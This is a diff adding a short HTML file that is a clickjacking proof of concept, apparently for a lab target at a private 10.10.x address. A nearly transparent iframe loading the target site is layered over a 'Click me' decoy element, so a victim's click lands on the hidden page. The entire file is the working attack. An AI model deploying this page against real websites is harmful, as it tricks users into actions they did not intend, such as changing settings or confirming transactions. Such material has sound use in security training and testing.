@@ -1,0 +1,26 @@
+<head>
+        <style>
+                #target_website {
+                        position:relative;
+                        width:1000px;
+                        height:1000px;
+                        opacity:0.1;
+                        z-index:2;
+                        }
+                #decoy_website {
+                        position:absolute;
+                        width:300px;
+                        height:400px;
+                        z-index:1;
+                        }
+        </style>
+</head>
+
+<body>
+        <div id="decoy_website" style="top:500px; left:100px">
+                Click me
+        </div>
+        <iframe id="target_website" src="http://10.10.11.120">
+        </iframe>
+</body>
+
